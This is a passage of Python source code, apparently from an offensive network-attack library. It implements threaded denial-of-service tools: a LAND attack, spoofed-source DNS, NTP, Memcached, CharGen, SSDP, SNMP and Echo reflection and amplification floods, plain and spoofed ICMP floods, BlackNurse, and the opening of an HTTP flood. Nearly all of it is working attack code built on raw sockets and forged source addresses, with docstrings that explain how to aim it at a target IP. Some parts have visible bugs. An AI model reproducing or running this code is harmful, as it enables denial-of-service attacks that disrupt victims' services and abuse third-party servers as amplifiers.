      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return udpstorm_counter
class ln(threading.Thread):
 def run(self):
  global land_counter
  self.minsize=minsize
  self.maxsize=maxsize
  self.interval=speed
  self.target=target
  self.port=port
  self.maxttl=maxttl
  self.minttl=minttl
  self.winds=winds
  self.min_win=min_win
  self.max_win=max_win
  self.paylo=paylo
  time.sleep(2)
  while (stop!=True):
   try:
    if self.winds==0:
     windf=0
    elif self.winds<0:
     windf=random.randint(self.min_win,self.max_win)#actual window size= this value * 256
    else:
     windf=self.winds
    if self.paylo==0:
     urd=''
     req='None'
    elif self.paylo==1:
      urd=''
      req='TCP'
      for x in range(random.randint(self.minsize,self.maxsize)):
       urd+=random.choice(lis)
      if len(urd)>1400:
       urd=urd[0:1400]
    elif self.paylo==2:
      pths=random.choice(paths)
      for l in range(random.randint(1,5)):
       ed=random.choice(ec)
       oi=random.randint(1,3)
       if oi==2:
        gy=0
        while gy<1:
          df=random.choice(ec)
          if df!=ed:
           gy+=1
        ed+=', '
        ed+=df
       l=random.choice(al)
       for n in range(random.randint(0,5)):
        l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
       kl=random.randint(1,2)
       if kl==1:
        req="GET"
        urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),self.target)
       else:
        req="POST"
        k=''
        for _ in range(1,random.randint(2,5)):
         k+=random.choice(lis)
        k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
        for _ in range(1,random.randint(1,3)):
         k+=random.choice(lis)
        j=''
        for x in range(0,random.randint(11,31)):
         j+=random.choice(lis)
        par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
        urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),self.target,par)
    packet = IP(ttl=random.randint(self.minttl,self.maxttl),src=self.target, dst=self.target)/TCP(window=windf,sport=self.port,dport=self.port)/urd
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(self.target,self.port))
    land_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets: {} | Type: {} | Bytes: {}   ".format(land_counter,req,len(urd)))
        sys.stdout.flush()
        #print("Packets: {} | Type: {} | Bytes: {}".format(land_counter,req,len(urd)))
   except Exception as e:
    pass
   time.sleep(self.interval)
  self.minsize=None
  self.maxsize=None
  self.interval=None
  self.target=None
  self.port=None
  self.maxttl=None
  self.minttl=None
  self.winds=None
  self.min_win=None
  self.max_win=None
  self.paylo=None
def land(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,threads=100,max_window=255,min_window=1,min_ttl=64,max_ttl=64,payload_type=0,window=-1,duration=60,logs=True,returning=False):
 '''
   this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
'''
 thr=[]
 global maxsize
 maxsize=max_size
 global minsize
 minsize=min_size
 global speed
 speed=interval
 if limiting==False:
  speed=0
 global land_counter
 land_counter=0
 global stop
 stop=False
 global max_win
 max_win=max_window
 if max_win>256:
   max_win=256
 global min_win
 min_win=min_window
 if min_win<0:
   min_win=0
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global maxttl
 maxttl=max_ttl
 global minttl
 minttl=min_ttl
 global paylo
 paylo=int(payload_type)
 if paylo<0:
   paylo=0
 if paylo>2:
   paylo=2
 global winds
 winds=window
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(ln().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return land_counter
class dampli(threading.Thread):
 def run(self):
  global dnsamplif_counter
  self.interval=speed
  self.target=target
  self.port=port
  self.query=query
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(dnsl)
    packet= IP(src=self.target, dst=ip) / UDP(sport=self.port,dport=53) / DNS(rd=1, qd=DNSQR(qname=random.choice(domainl), qtype=self.query))
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,53))
    dnsamplif_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(dnsamplif_counter,ip))
        sys.stdout.flush()
        #print ("Packets sent: {} | IP: {}".format(dnsamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.interval)
  self.interval=None
  self.target=None
  self.port=None
  self.query=None
def dns_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,q='ANY',duration=60,logs=True,returning=False):
 '''
   this function is for DNS amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   servers: your DNS servers list
   threads: (set by default to: 100)
   q: (set by default to: "ANY") query type

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.dns_amplification_attack('8.8.8.8',dnslist=a)

'''
 thr=[]
 global speed
 speed=interval
 if limiting==False:
  speed=0
 global dnsamplif_counter
 dnsamplif_counter=0
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global dnsl
 dnsl=[]
 dnsl=servers
 if dnsl==[]:
  dns1=get_public_dns()
  for x in dns1:
   if '.' in x:
    dnsl.append(x)
 global query
 query=q
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(dampli().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return dnsamplif_counter
class nampli(threading.Thread):
 def run(self):
  global ntpamplif_counter
  self.interval=speed
  self.target=target
  self.port=port
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(ntpl)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=123)/Raw(load='\x17\x00\x02\x2a'+'\x00'*4)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,123))
    ntpamplif_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(ntpamplif_counter,ip))
        sys.stdout.flush()
        #print ("Packets sent: {} | IP: {}".format(ntpamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.interval)
  self.interval=None
  self.target=None
  self.port=None
def ntp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=False):
 '''
   this function is for NTP amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   servers: your NTP servers list
   threads: (set by default to: 100)

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.ntp_amplification_attack('8.8.8.8',ntplist=a)

'''
 thr=[]
 global ntpamplif_counter
 global speed
 if level<=1:
  speed=0.1
 elif level==2:
  speed=0.05
 elif level==3:
  speed=0.01
 elif level==4:
  speed=0.005
 elif level>=5:
  speed=0.001
 if limiting==False:
  speed=0
 ntpamplif_counter=0
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global ntpl
 ntpl=servers
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(nampli().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return ntpamplif_counter
class memampli(threading.Thread):
 def run(self):
  global memcacheamplif_counter
  self.interval=speed
  self.target=target
  self.port=port
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(meml)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=11211)/Raw(load="\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,11211))
    memcacheamplif_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(memcacheamplif_counter,ip))
        sys.stdout.flush()
        #print ("Packets sent: {} | IP: {}".format(memcacheamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.interval)
  self.interval=None
  self.target=None
  self.port=None
def memcache_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=False):
 '''
   this function is for Memcached amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   servers: your Memcache servers list
   threads: (set by default to: 100)

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.memcache_amplification_attack('8.8.8.8',memlist=a)

'''
 thr=[]
 global memcacheamplif_counter
 memcacheamplif_counter=0
 global speed
 speed=interval
 if limiting==False:
  speed=0
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global meml
 meml=servers
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(memampli().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return memcacheamplif_counter
class charampli(threading.Thread):
 def run(self):
  global chargenamplif_counter
  self.target=target
  self.interval=speed
  self.port=port
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(chargenl)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=19)/random.choice(lis)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,19))
    chargenamplif_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(chargenamplif_counter,ip))
        sys.stdout.flush()
        #print ("Packets sent: {} | IP: {}".format(chargenamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.interval)
  self.target=None
  self.interval=None
  self.port=None
def chargen_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=False):
 '''
   this function is for CharGen amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   servers: your CharGen servers list
   threads: (set by default to: 100)

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.chargen_amplification_attack('8.8.8.8',ntplist=a)

'''
 thr=[]
 global chargenamplif_counter
 chargenamplif_counter=0
 global speed
 speed=interval
 if limiting==False:
  speed=0
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global chargenl
 chargenl=servers
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(charampli().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return chargenamplif_counter
class ssampli(threading.Thread):
 def run(self):
  global ssdpamplif_counter
  self.interval=speed
  self.target=target
  self.port=port
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(ssdpl)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=1900)/Raw(load='M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,1900))
    ssdpamplif_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(ssdpamplif_counter,ip))
        sys.stdout.flush()
        #print ("Packets sent: {} | IP: {}".format(ssdpamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.interval)
  self.interval=None
  self.target=None
  self.port=None
def ssdp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=False):
 '''
   this function is for CharGen amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   servers: your CharGen servers list
   threads: (set by default to: 100)

   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.ssdp_amplification_attack('8.8.8.8',ntplist=a)

'''
 thr=[]
 global ssdpamplif_counter
 ssdpamplif_counter=0
 global speed
 speed=interval
 if limiting==False:
  speed=0
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global ssdpl
 ssdpl=servers
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(ssampli().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return ssdpamplif_counter
class snampli(threading.Thread):
 def run(self):
  global snmpamplif_counter
  self.target=target
  self.interval=speed
  self.port=port
  time.sleep(2)
  while (stop!=True):
   try:
    ip=random.choice(snmpl)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=161)/Raw(load='\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00')
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,161))
    snmpamplif_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets sent: {} | IP: {}   ".format(snmpamplif_counter,ip))
        sys.stdout.flush()
        #print ("Packets sent: {} | IP: {}".format(snmpamplif_counter,ip))
   except Exception as e:
    pass
   time.sleep(self.interval)
  self.target=None
  self.interval=None
  self.port=None
def snmp_amplification(u,p=80,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=False):
 '''
   this function is for SNMP amplification attack using and list of DNS servers provided by the user.

   it takes the following parameters:

   u: target IP
   servers: your SNMP servers list
   threads: (set by default to: 100)
  
   exapmle:

   >>>a=['124.0.2.2','22.3.55.45',.........]
   >>>bane.snmp_amplification_attack('8.8.8.8',snmplist=a)

'''
 thr=[]
 global snmpamplif_counter
 snmpamplif_counter=0
 global speed
 speed=interval
 if limiting==False:
  speed=0
 global stop
 stop=False
 
 prinnts=logs
 global target
 target=u
 global port
 port=p
 global snmpl
 snmpl=servers
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(snampli().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return snmpamplif_counter
class echst(threading.Thread):
 def run(self):
  global echo_ref_counter
  self.target=target
  self.minsize=minsize
  self.maxsize=maxsize
  self.interval=speed
  self.port=port
  time.sleep(2)
  while (stop!=True):
   data=''
   for x in range(random.randint(self.minsize,self.maxsize)):
    data +=random.choice(lis)
   if len(data)>1400:
    data=data[0:1400]
   try:
    ip=random.choice(pingl)
    packet=IP(src=self.target, dst=ip)/UDP(sport=self.port,dport=7)/Raw(load=data)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(ip,port))
    echo_ref_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets sent: {} | IP: {} | Bytes: {}   ".format(echo_ref_counter,ip,len(data)))
        sys.stdout.flush()
        #print("Packets sent: {} | IP: {} | Bytes: {}".format(echo_ref_counter,ip,len(data)))
   except Exception as e:
    pass
   time.sleep(self.interval)
  self.target=None
  self.minsize=None
  self.maxsize=None
  self.interval=None
  self.port=None
def echo_reflection(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,servers=[],threads=100,duration=60,logs=True,returning=True):
 '''
   this function is for ECHO  reflection attack
'''
 thr=[]
 global minsize
 minsize=min_size
 global maxsize
 maxsize=max_size
 global echo_ref_counter
 echo_ref_counter=0
 global speed
 speed=interval
 if limiting==False:
  speed=0
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global pingl
 pingl=servers
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(echst().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return echo_ref_counter
class icmpcl(threading.Thread):
 def run(self):
  global icmp_counter
  self.interval=speed
  self.minsize=minsize
  self.maxsize=maxsize
  self.target=target
  self.port=port
  self.minttl=minttl
  self.maxttl=maxttl
  self.logs=True
  time.sleep(2)
  while (stop!=True):
   data=''
   for x in range(random.randint(self.minsize,self.maxsize)):
     data +=random.choice(lis)
   if len(data)>1400:
    data=data[0:1400]
   try:
    packet=IP(ttl=random.randint(self.minttl,self.maxttl),dst=self.target)/ICMP()/data
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(self.target,self.port))
    icmp_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets sent: {} | Bytes: {}  ".format(icmp_counter,len(data)))
        sys.stdout.flush()
        #print("Packets sent: {} | Bytes: {}".format(icmp_counter,len(data)))
   except Exception as e:
    pass
   time.sleep(self.interval)
  self.interval=None
  self.minsize=None
  self.maxsize=None
  self.target=None
  self.port=None
  self.minttl=None
  self.maxttl=None
def icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,min_ttl=64,max_ttl=64,threads=100,duration=60,logs=True,returning=False):
 '''
   this function is for ICMP flood attack
'''
 thr=[]
 global maxsize
 maxsize=max_size
 global minsize
 minsize=min_size
 global speed
 speed=interval
 if limiting==False:
  speed=0
 global icmp_counter
 icmp_counter=0
 global stop
 stop=False
 
 logs=logs
 global target
 target=u
 global port
 port=p
 global maxttl
 maxttl=max_ttl
 global minttl
 minttl=min_ttl
 wh=1
 '''try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")'''
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(icmpcl().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return icmp_counter
class icmpst(threading.Thread):
 def run(self):
  global icmpstorm_counter
  self.interval=speed
  self.target=target
  self.port=port
  self.minttl=minttl
  self.maxttl=maxttl
  self.minsize=minsize
  self.maxsize=maxsize
  self.ip_seg=ip_seg
  self.logs=True
  time.sleep(2)
  while (stop!=True):
   data=''
   for x in range(random.randint(self.minsize,self.maxsize)):
     data +=random.choice(lis)
   if len(data)>1400:
    data=data[0:1400]
   try:
    if self.ip_seg==None:
     sip=getip()
    else:
     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    packet=IP(ttl=random.randint(self.minttl,self.maxttl),src=sip,dst=self.target)/ICMP()/data
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(self.target,self.port))
    icmpstorm_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets sent: {} | IP: {} | Bytes: {}  ".format(icmpstorm_counter,sip,len(data)))
        sys.stdout.flush()
        #print("Packets sent: {} | IP: {} | Bytes: {}".format(icmpstorm_counter,sip,len(data)))
   except Exception as e:
    print(e)
   time.sleep(self.interval)
  self.interval=None
  self.target=None
  self.port=None
  self.minttl=None
  self.maxttl=None
  self.minsize=None
  self.maxsize=None
  self.ip_seg=None
def spoofed_icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,duration=60,logs=True,returning=True):
 '''
   this function is for ICMP flood with spoofed sources
'''
 thr=[]
 global minsize
 minsize=min_size
 global maxsize
 maxsize=max_size
 global icmpstorm_counter
 icmpstorm_counter=0
 global speed
 speed=interval
 if limiting==False:
  speed=0
 global stop
 stop=False
 global ip_seg
 ip_seg=ip_range
 
 logs=logs
 global target
 target=u
 global port
 port=p
 global maxttl
 maxttl=max_ttl
 global minttl
 minttl=min_ttl
 wh=1
 '''try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")'''
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(icmpst().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return icmpstorm_counter
class blnu(threading.Thread):
 def run(self):
  global blacknurse_counter
  self.target=target
  self.interval=speed
  self.port=port
  self.minttl=minttl
  self.maxttl=maxttl
  self.ip_seg=ip_seg
  time.sleep(2)
  while (stop!=True):
   try:
    if self.ip_seg==None:
     sip=getip()
    else:
     sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    packet=IP(ttl=random.randint(self.minttl,self.maxttl),src=sip,dst=self.target)/ICMP(type=3,code=3)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet=bytes(packet)
    s.sendto(packet,(self.target,self.port))
    blacknurse_counter+=1
    if self.logs==True:
        sys.stdout.write("\rPackets sent: {} | IP: {}  ".format(blacknurse_counter,sip))
        sys.stdout.flush()
        #print ("Packets sent: {} | IP: {}".format(blacknurse_counter,sip))
   except Exception as e:
    pass
   time.sleep(self.interval)
  self.target=None
  self.interval=None
  self.port=None
  self.minttl=None
  self.maxttl=None
  self.ip_seg=None
def blacknurse(u,p=80,limiting=True,interval=0.1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,duration=60,logs=True,returning=False):
 '''
   this function is for "black nurse" attack
'''
 thr=[]
 global blacknurse_counter
 blacknurse_counter=0
 global speed
 speed=interval
 if limiting==False:
  speed=0
 global stop
 stop=False
 global ip_seg
 ip_seg=ip_range
 
 self.logs=logs
 global target
 target=u
 global port
 port=p
 global maxttl
 maxttl=max_ttl
 global minttl
 minttl=min_ttl
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error as msg:
  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
 if wh>0:  
  for x in range(threads):
   try:
    thr.append(blnu().start())
   except:
    pass
  c=time.time()
  while True:
   if stop==True:
     break
   try:
    time.sleep(.1)
    if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
    stop=True
    break
  if logs==True:
     print("[*]Killing all threads...")
  for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
  if logs==True:
     print("[*]Done!")
  if returning==True:
    return blacknurse_counter
class gldn(threading.Thread):
 def run(self):
  global goldeneye_counter
  self.target=target
  self.port=port
  self.method=method
  self.timeout=_timeout
  time.sleep(2)
  while (stop!=True):
   pa=random.choice(paths)
   try:
    conn = httplib.HTTPConnection(self.target, self.port, timeout=self.timeout)
    if self.method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in pa:
      jo='&'
     else:
      jo='?' 
     pa+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': self.target}
     conn.request("GET", pa,headers=h)
    elif self.method==2:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      params =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(300,500))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': self.target}
      conn.request("POST",pa , params, headers)
    elif self.method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in pa:
       jo='&'
      else:
